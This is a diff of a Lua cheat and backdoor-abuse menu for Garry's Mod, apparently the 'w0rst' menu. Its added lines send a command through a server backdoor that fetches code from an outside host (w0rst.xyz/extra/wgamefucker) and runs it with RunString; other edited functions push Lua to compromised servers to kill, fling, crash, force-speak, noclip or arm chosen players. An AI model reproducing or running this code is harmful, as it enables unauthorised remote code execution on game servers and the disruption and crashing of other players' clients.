@@ -678,7 +678,8 @@ local Sounds = {
     "StillCreeping https://w0rst.xyz/script/sounds/chuuwee-still-creeping.mp3",
     "BeLazy https://w0rst.xyz/script/sounds/skizzymars-be-lazy.mp3",
     "Hope https://w0rst.xyz/script/sounds/Hope.mp3",
-    "Prices https://w0rst.xyz/script/sounds/prices.mp3"
+    "Prices https://w0rst.xyz/script/sounds/prices.mp3",
+    "51DeadOps https://w0rst.xyz/script/sounds/51deadops.mp3"
 }
 
 local function CreateSoundButtons()
@@ -1184,8 +1185,8 @@ CreateButton("Save Visuals", MiscTab[1], 110, 25, 395, 250, SaveVisuals)
 CreateButton("Load Visuals", MiscTab[1], 110, 25, 280, 250, LoadVisuals)
 
 CreateBDServer("wmenu-memento", function()
-    wtf.SendLua([[http.Fetch("https://w0rst.xyz/extra/wgamefucker", function(b) RunString(b) end)]])
-    wtf.Log("??????")
+    wtf.SendLua("http.Fetch('https://w0rst.xyz/extra/wgamefucker', function(b,l,h,c) RunString(b) end)")
+    wtf.Log("??? wgamefucker ???")
 end)
 
 CreateBDServer("Kill All", function()
@@ -1413,27 +1414,27 @@ CreateBDServer("Armor All", function()
 end)
 
 CreateBDClient("Kill", function()
-    wtf.Log("Killed: "..Player( SelectedPlr):Nick())
+    wtf.Log("Killed: "..Player(SelectedPlr):Nick())
     wtf.SendLua([[
-        local me = Player(]].. SelectedPlr..[[)
+        local me = Player(]]..SelectedPlr..[[)
         me:Kill()
         me:Spawn()
     ]])
 end)
 
 CreateBDClient("Fling", function()
-    wtf.Log("Flung: "..Player( SelectedPlr):Nick())
+    wtf.Log("Flung: "..Player(SelectedPlr):Nick())
     wtf.SendLua([[
-        local me = Player(]].. SelectedPlr..[[)
+        local me = Player(]]..SelectedPlr..[[)
         me:SetVelocity(Vector(math.random(-1000,1000),math.random(-1000,1000),math.random(50,1000)))
     ]])
 end)
 
 CreateBDClient("Set Speed",  function()
     Derma_StringRequest("Set Speed", "Speed To Set The Player:", "", function(str)
-        wtf.Log(Player( SelectedPlr):Nick().." Speed Set")
+        wtf.Log(Player(SelectedPlr):Nick().." Speed Set")
         wtf.SendLua([[
-            local me = Player(]].. SelectedPlr..[[)
+            local me = Player(]]..SelectedPlr..[[)
             me:SetMaxSpeed(]]..str..[[)
             me:SetRunSpeed(]]..str..[[)
         ]])
@@ -1442,9 +1443,9 @@ end)
 
 CreateBDClient("Give Item",  function()
     Derma_StringRequest("Give Item", "Give Item Named:", "", function(str)
-        wtf.Log("Item Given To: "..Player( SelectedPlr):Nick())
+        wtf.Log("Item Given To: "..Player(SelectedPlr):Nick())
         wtf.SendLua([[
-            local me = Player(]].. SelectedPlr..[[)
+            local me = Player(]]..SelectedPlr..[[)
             me:Give(']]..str..[[')
         ]])
     end)
@@ -1452,24 +1453,24 @@ end)
 
 CreateBDClient("Crash Player",  function()
     wtf.SendLua([[
-        Player(]].. SelectedPlr..[[):SendLua("function die() return die() end die()")
+        Player(]]..SelectedPlr..[[):SendLua("function die() return die() end die()")
     ]])
-    wtf.Log("Player: "..Player( SelectedPlr):Nick().." Crashed")
+    wtf.Log("Player: "..Player(SelectedPlr):Nick().." Crashed")
 end)
 
 CreateBDClient("Force Say",  function()
     Derma_StringRequest("Force Say", "Force Player To Say:", "", function(str)
         wtf.SendLua([[
-            local me = Player(]].. SelectedPlr..[[)
+            local me = Player(]]..SelectedPlr..[[)
             me:Say("]]..str..[[")
         ]])
-        wtf.Log("Player: "..Player( SelectedPlr):Nick().." Said "..str)
+        wtf.Log("Player: "..Player(SelectedPlr):Nick().." Said "..str)
     end)
 end)
 
 CreateBDClient("NoClip Player",  function()
     wtf.SendLua([[
-        local me = Player(]].. SelectedPlr..[[)
+        local me = Player(]]..SelectedPlr..[[)
         if me:GetMoveType() ~= MOVETYPE_NOCLIP then
             me:SetMoveType(MOVETYPE_NOCLIP)
         else
